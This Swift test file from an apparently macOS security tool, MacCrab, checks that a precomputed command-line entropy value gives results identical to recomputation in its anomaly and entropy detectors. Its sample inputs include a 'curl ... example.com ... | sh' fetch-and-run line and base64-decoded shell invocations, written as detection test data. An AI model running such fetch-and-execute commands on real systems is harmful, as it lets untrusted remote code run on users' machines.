// EntropyDedupParityTests.swift
// Parity coverage for perf-scoping item #19: the command-line Shannon entropy
// is now computed once in EventLoop and threaded into both
// StatisticalAnomalyDetector.processEvent (commandLineEntropy:) and
// EntropyAnalysis.analyzeCommandLine (fullEntropy:). These tests prove the
// injected-value path is byte-identical to the recompute path and that the
// shared value equals shannonEntropy(commandLine).

import Testing
import Foundation
@testable import MacCrabCore

@Suite("Entropy dedup parity (#19)")
struct EntropyDedupParityTests {

    // A spread of command lines: empty, short, long/base64-ish, all-args,
    // unicode/emoji, and multi-arg with a high-entropy blob.
    static let samples: [String] = [
        "",
        "cron -s",
        "ls -la /usr/bin",
        "python3 -c aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q=",
        "/bin/sh -c \"echo dGVzdHN0cmluZ2Zvcm1hY2NyYWI= | base64 -d\"",
        "curl -fsSL https://example.com/aB3xZ9qLmN0pQrStUvWxYz12 | sh",
        String(repeating: "-x ", count: 60),
        "node --experimental-vm-modules /Users/foo/.build/x/y/z.js --flag=abcdef0123456789ABCDEF",
        "swift build -c release --product maccrabd",
        "开发 テスト 🔒 mixed-unicode --arg=Zm9vYmFyYmF6cXV4Y29ycHVzTG9uZ0VudHJvcHk",
    ]

    /// The load-bearing assumption of the dedup: within one process, computing
    /// shannonEntropy twice over the same string yields the identical value, so
    /// sharing one computed value cannot change any downstream threshold.
    @Test("shannonEntropy is deterministic — shared value == recomputed value")
    func sharedEqualsShannon() {
        for cmd in Self.samples {
            let a = EntropyAnalysis.shannonEntropy(cmd)
            let b = EntropyAnalysis.shannonEntropy(cmd)
            #expect(a == b, "shannonEntropy must be deterministic for: \(cmd)")
        }
    }

    /// analyzeCommandLine with an injected fullEntropy must return exactly what
    /// the recompute path returns, and the injected value must equal
    /// shannonEntropy(cmdline).
    @Test("analyzeCommandLine: injected fullEntropy == recomputed, all fields")
    func analyzeCommandLineParity() {
        for cmd in Self.samples {
            let shared = EntropyAnalysis.shannonEntropy(cmd)
            let recomputed = EntropyAnalysis.analyzeCommandLine(cmd)
            let injected = EntropyAnalysis.analyzeCommandLine(cmd, fullEntropy: shared)
            #expect(injected.entropy == recomputed.entropy, "entropy mismatch for: \(cmd)")
            #expect(injected.suspicious == recomputed.suspicious, "suspicious mismatch for: \(cmd)")
            #expect(injected.segment == recomputed.segment, "segment mismatch for: \(cmd)")
        }
    }

    /// StatisticalAnomalyDetector fed identical event streams — one injecting the
    /// shared entropy, one recomputing — must emit identical anomalies (proving
    /// the accumulated argEntropy Welford stats and the commandline_entropy
    /// anomaly are unaffected by the dedup). The stream is shaped so the entropy
    /// feature actually fires (constant baseline then a high-entropy blob).
    @Test("StatisticalAnomalyDetector: injected commandLineEntropy == recompute path")
    func statisticalParity() async {
        let injected = StatisticalAnomalyDetector(zThreshold: 3.0, minSamples: 5)
        let recomputed = StatisticalAnomalyDetector(zThreshold: 3.0, minSamples: 5)

        let cmds = [
            "cron -s", "cron -s", "cron -s", "cron -s", "cron -s", "cron -s",
            "cron -s Zm9vYmFyYmF6cXV4Y29ycHVzMTIzNDU2Nzg5MEhpZ2hFbnRyb3B5QmxvYg==",
        ]

        var injectedAll: [String] = []
        var recomputedAll: [String] = []
        let base = Date(timeIntervalSince1970: 1_700_000_000)

        for (i, cmd) in cmds.enumerated() {
            let ts = base.addingTimeInterval(Double(i) * 60)
            let argCount = cmd.split(separator: " ").count
            let shared = EntropyAnalysis.shannonEntropy(cmd)

            let a = await injected.processEvent(
                processPath: "/usr/bin/cron", argCount: argCount,
                commandLine: cmd, category: "process", timestamp: ts,
                commandLineEntropy: shared)
            let b = await recomputed.processEvent(
                processPath: "/usr/bin/cron", argCount: argCount,
                commandLine: cmd, category: "process", timestamp: ts)

            injectedAll += a.map { "\($0.feature)|\($0.value)|\($0.mean)|\($0.stddev)|\($0.zScore)" }
            recomputedAll += b.map { "\($0.feature)|\($0.value)|\($0.mean)|\($0.stddev)|\($0.zScore)" }
        }

        #expect(injectedAll == recomputedAll,
                "injected-entropy path must emit identical anomalies to the recompute path")
        #expect(injectedAll.contains { $0.hasPrefix("commandline_entropy|") },
                "test stream should exercise the commandline_entropy feature at least once")
    }
}
